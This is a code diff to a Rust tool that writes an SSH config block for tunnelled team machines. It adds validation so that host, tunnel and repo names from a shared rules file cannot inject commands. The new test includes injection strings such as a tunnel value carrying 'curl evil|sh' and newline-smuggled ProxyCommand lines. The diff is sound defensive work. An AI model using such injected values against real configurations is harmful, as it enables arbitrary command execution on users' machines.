@@ -241,7 +241,7 @@ pub fn machines(rules_json: &str) -> Vec<Machine> {
         let personal = h["personal"].as_bool().unwrap_or(false);
         let tunnel = h["tunnel"].as_str().filter(|t| !t.is_empty()).map(String::from);
         let cert = h["cert"].as_bool().unwrap_or(false);
-        let user = h["account"].as_str().filter(|a| !a.is_empty()).unwrap_or("ntk").to_string();
+        let user = h["account"].as_str().filter(|a| account_ok(a)).unwrap_or("ntk").to_string();
         h["repos"].as_object().into_iter().flatten().map(move |(repo, acct)| Machine {
             host: host.clone(), repo: repo.clone(), account: acct.as_str().unwrap_or_default().to_string(), user: user.clone(), ready,
             note: note.clone(), sometimes, via: via.clone(), personal, tunnel: tunnel.clone(), cert,
@@ -305,11 +305,16 @@ pub fn edit_machines(text: &str, edit: &dyn Fn(&Value, &str) -> Option<Option<St
 /// The block the app keeps in ~/.ssh/config: one alias per tunnelled machine, reached through the app itself
 /// (`app` is its program's path, used as ssh's ProxyCommand). Machines without a tunnel are left out.
 pub fn ssh_block(machines: &[Machine], app: &str) -> String {
+    // the names come from vault_rules.json, which every member with write access can change, and `Match ... exec`
+    // goes through the shell: a name or a tunnel that is not a plain hostname is left out, never written
+    let plain = |s: &str, dots: bool| !s.is_empty() && s.len() <= 100 && !s.starts_with(['-', '.']) && !s.contains("..")
+        && s.bytes().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == b'-' || (dots && c == b'.'));
     let mut seen = BTreeSet::new();
     let mut out = String::from("# >>> aIwalk System Setup: machines through Cloudflare (this block is rewritten by the app)\n");
     let app = app.replace('%', "%%");   // % is ssh's token marker
     for m in machines {
         let Some(t) = &m.tunnel else { continue };
+        if !plain(&m.host, false) || !plain(t, true) { continue }
         if !seen.insert(m.host.clone()) { continue }
         if m.cert {
             // the certificate lasts minutes, so ssh asks the app for a fresh one before every connection (Match exec);
@@ -361,7 +366,10 @@ pub fn request_body(repo: &str, level: &str, note: &str) -> String {
 pub fn parse_request(body: &str) -> Option<(String, String)> {
     let field = |k: &str| body.lines().find_map(|l| l.strip_prefix(k)).map(|v| v.trim().to_string());
     let (repo, level) = (field("repo:")?, field("level:")?);
-    (!repo.is_empty() && (level == "read" || level == "write")).then_some((repo, level))
+    // a repo's name and nothing else: it becomes part of an API path with an owner's rights behind it
+    let named = !repo.is_empty() && repo.len() <= 100 && !repo.starts_with('.')
+        && repo.bytes().all(|c| c.is_ascii_alphanumeric() || b"._-".contains(&c));
+    (named && (level == "read" || level == "write")).then_some((repo, level))
 }
 
 /// How to give `login` exactly `level` (0 none, 1 read, 2 write) on `repo`.
@@ -833,6 +841,15 @@ mod tests {
             assert!(super::ssh_destination(bad, z).is_err(), "{bad} should be refused");
         }
         assert!(super::ssh_destination("ntk@otter.example.org", z).unwrap_err().contains("not one of the team's machines"));
+    }
+
+    #[test]
+    fn rules_cannot_put_a_command_in_the_ssh_config() {
+        let m = |host: &str, tunnel: &str| Machine { host: host.into(), tunnel: Some(tunnel.into()), cert: true, ..Default::default() };
+        let block = ssh_block(&[m("otter", "ssh-otter.example.org"), m("*", "ssh-x.example.org"), m("heron", "ssh-h.example.org;curl evil|sh;#"),
+                                m("crane", "ssh-c.example.org\n  ProxyCommand evil"), m("ibis\nHost *", "ssh-i.example.org")], "/app");
+        assert_eq!(block.matches("Match originalhost").count(), 1, "{block}");
+        assert!(block.contains("Match originalhost otter ") && !block.contains("evil") && !block.contains('*'));
     }
 
     #[test]
